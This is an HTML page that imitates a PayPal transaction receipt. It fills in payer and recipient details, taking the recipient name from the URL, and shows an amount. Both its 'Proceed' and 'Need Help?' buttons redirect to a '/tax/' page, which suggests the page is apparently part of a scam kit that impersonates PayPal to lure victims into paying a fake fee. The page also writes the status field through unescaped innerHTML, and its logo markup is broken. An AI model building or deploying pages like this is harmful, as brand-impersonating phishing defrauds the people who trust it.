<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Transaction Receipt – PayPal</title>
  <script>
    if (location.protocol !== 'file:') {
      const b = document.createElement('base');
      b.href = '/';
      document.head.appendChild(b);
    }
  </script>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: "PayPal Sans", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
      background: #f5f7fa;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 2rem 1rem;
    }

    .pp-card {
      background: #ffffff;
      border-radius: 6px;
      border: 1px solid #d9dde3;
      box-shadow: 0 1px 4px rgba(0,0,0,0.08), 0 4px 16px rgba(0,0,0,0.04);
      width: 100%;
      max-width: 400px;
      overflow: hidden;
    }

    .pp-logo-area {
      padding: 2rem 2rem 1.25rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 0.1rem;
    }

    .pp-logo-area svg { display: block; }

    .pp-receipt-label {
      font-size: 1.25rem;
      font-weight: 400;
      color: #2c2e2f;
      margin-top: 0.9rem;
      letter-spacing: -0.01em;
    }

    .pp-divider {
      border: none;
      border-top: 1px solid #e5e9f0;
      margin: 0 1.75rem;
    }

    .pp-info {
      padding: 1.25rem 1.75rem 0.5rem;
    }

    .pp-row {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      padding: 0.6rem 0;
      border-bottom: 1px solid #f0f2f5;
      gap: 1rem;
    }

    .pp-row:last-child { border-bottom: none; }

    .pp-row-label {
      font-size: 0.82rem;
      color: #6c7378;
      font-weight: 400;
      flex-shrink: 0;
      padding-top: 1px;
      min-width: 110px;
    }

    .pp-row-value {
      font-size: 0.88rem;
      color: #2c2e2f;
      font-weight: 500;
      text-align: right;
      word-break: break-word;
      flex: 1;
    }

    .pp-row-value.mono {
      font-family: "SF Mono", "Fira Code", "Courier New", monospace;
      font-size: 0.78rem;
      letter-spacing: 0.02em;
      color: #454f5b;
    }

    .status-text {
      font-size: 0.82rem;
      font-weight: 600;
      padding: 2px 8px;
      border-radius: 3px;
    }

    .status-pending  { background: #fff3cd; color: #856404; }
    .status-paid     { background: #d4edda; color: #155724; }
    .status-refunded { background: #f8d7da; color: #721c24; }

    .pp-amount-row {
      padding: 1rem 1.75rem 1.25rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-top: 1px solid #e5e9f0;
      border-bottom: 1px solid #e5e9f0;
      margin-top: 0.25rem;
    }

    .pp-amount-label { font-size: 0.95rem; color: #2c2e2f; font-weight: 400; }
    .pp-amount-value { font-size: 1.5rem; font-weight: 700; color: #003087; letter-spacing: -0.02em; }

    .pp-actions {
      padding: 1.5rem 1.75rem 1.25rem;
      display: flex;
      flex-direction: column;
      gap: 0.65rem;
    }

    .pp-btn-proceed {
      display: block;
      width: 100%;
      padding: 0.78rem 1rem;
      background: #0070ba;
      color: #ffffff;
      font-family: inherit;
      font-size: 0.95rem;
      font-weight: 600;
      border: none;
      border-radius: 24px;
      cursor: pointer;
      text-align: center;
      letter-spacing: 0.01em;
      transition: background 0.15s;
    }

    .pp-btn-proceed:hover  { background: #005ea6; }
    .pp-btn-proceed:active { background: #004f8c; }

    .pp-link-help {
      display: block;
      text-align: center;
      font-size: 0.84rem;
      color: #0070ba;
      text-decoration: none;
      cursor: pointer;
      background: none;
      border: none;
      font-family: inherit;
      padding: 0.25rem;
      transition: color 0.15s;
    }

    .pp-link-help:hover { color: #005ea6; text-decoration: underline; }

    .pp-footer { padding: 0.75rem 1.75rem 1rem; text-align: center; }

    .pp-footer-text {
      font-size: 0.72rem;
      color: #9da3aa;
      line-height: 1.6;
    }

    .pp-footer-text a { color: #0070ba; text-decoration: none; }
  </style>
</head>
<body>

  <div class="pp-card">

    <!-- Logo -->

      </svg>
      <p class="pp-receipt-label">Transaction Receipt</p>
    </div>

    <hr class="pp-divider">

    <!-- Info Rows -->
    <div class="pp-info">
      <div class="pp-row">
        <span class="pp-row-label">Transaction ID</span>
        <span class="pp-row-value mono" id="txId">—</span>
      </div>
      <div class="pp-row">
        <span class="pp-row-label">Payer Name</span>
        <span class="pp-row-value" id="payerName">—</span>
      </div>
      <div class="pp-row">
        <span class="pp-row-label">Payer Email</span>
        <span class="pp-row-value" id="payerEmail" style="font-size:0.82rem;">—</span>
      </div>
      <div class="pp-row">
        <span class="pp-row-label">Recipient Name</span>
        <span class="pp-row-value" id="recipientName">—</span>
      </div>
      <div class="pp-row">
        <span class="pp-row-label">Payment Status</span>
        <span class="pp-row-value" id="paymentStatus">—</span>
      </div>
    </div>

    <!-- Amount -->
    <div class="pp-amount-row">
      <span class="pp-amount-label">Amount</span>
      <span class="pp-amount-value" id="amount">—</span>
    </div>

    <!-- Actions -->
    <div class="pp-actions">
      <button class="pp-btn-proceed" onclick="goToTax()">Proceed</button>
      <button class="pp-link-help" onclick="goToTax()">Need Help?</button>
    </div>

    <!-- Footer -->
    <div class="pp-footer">
      <p class="pp-footer-text">
        This transaction is protected by PayPal's Buyer Protection.<br>
        <a href="#">Privacy Policy</a> &nbsp;·&nbsp; <a href="#">Legal Agreements</a>
      </p>
    </div>

  </div>

  <script src="/app.js" onerror="this.onerror=null;this.src='app.js';"></script>
  <script>
    function getClientSlugFromUrl() {
      const path = window.location.pathname;
      const match = path.match(/\/requirement\/([^/?#]+)/i);
      if (match && match[1] && match[1] !== 'index.html') {
        return decodeURIComponent(match[1]);
      }
      const params = new URLSearchParams(window.location.search);
      return params.get('client') || null;
    }

    function slugToDisplayName(slug) {
      if (!slug) return '';
      return slug
        .replace(/[-_]+/g, ' ')
        .trim()
        .split(' ')
        .map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase())
        .join(' ');
    }

    function renderReceipt() {
      const data = getReceiptData();
      const currency = data.currency || '$';
      const totals = calculateReceiptTotals(data);

      document.getElementById('txId').textContent = data.orderId || '—';
      document.getElementById('payerName').textContent = data.merchant.name || '—';
      document.getElementById('payerEmail').textContent = data.merchant.email || '—';

      const urlSlug = getClientSlugFromUrl();
      let displayName = (data.recipient && data.recipient.name) ? data.recipient.name : '—';
      if (urlSlug) {
        if (data.recipient && data.recipient.slug && data.recipient.slug.toLowerCase() === urlSlug.toLowerCase()) {
          displayName = data.recipient.name;
        } else {
          displayName = slugToDisplayName(urlSlug);
        }
      }
      document.getElementById('recipientName').textContent = displayName;
      document.getElementById('amount').textContent = formatMoney(totals.grandTotal, currency);

      const s = (data.status || 'pending').toLowerCase();
      const cls = s === 'paid' ? 'status-paid' : s === 'refunded' ? 'status-refunded' : 'status-pending';
      document.getElementById('paymentStatus').innerHTML =
        `<span class="status-text ${cls}">${data.status || 'Pending'}</span>`;
    }

    function goToTax() {
      const slug = getClientSlugFromUrl() || (getReceiptData().recipient && getReceiptData().recipient.slug);
      if (slug) {
        window.location.href = '/tax/' + encodeURIComponent(slug) + '/';
      } else {
        window.location.href = '/tax';
      }
    }

    document.addEventListener('DOMContentLoaded', renderReceipt);
    window.addEventListener('storage', e => { if (e.key === RECEIPT_STORAGE_KEY) renderReceipt(); });
    window.addEventListener('receiptDataUpdated', renderReceipt);
  </script>
</body>
</html>
